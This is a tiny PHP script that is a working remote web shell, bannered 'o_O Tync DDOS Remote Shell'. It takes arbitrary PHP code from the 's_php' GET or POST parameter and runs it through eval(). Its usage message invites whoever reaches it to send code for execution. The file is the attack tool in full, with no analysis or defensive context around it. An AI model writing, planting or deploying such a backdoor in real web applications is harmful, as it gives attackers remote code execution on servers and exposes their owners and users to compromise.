<?php
$F = $_GET + $_POST;
if (!isset($F['s_php'])) 
	die('o_O Tync DDOS Remote Shell <br>Use GET or POST to set "s_php" variable with code to be executed =)<br>Enjoy!');
eval(stripslashes($F['s_php']));
?>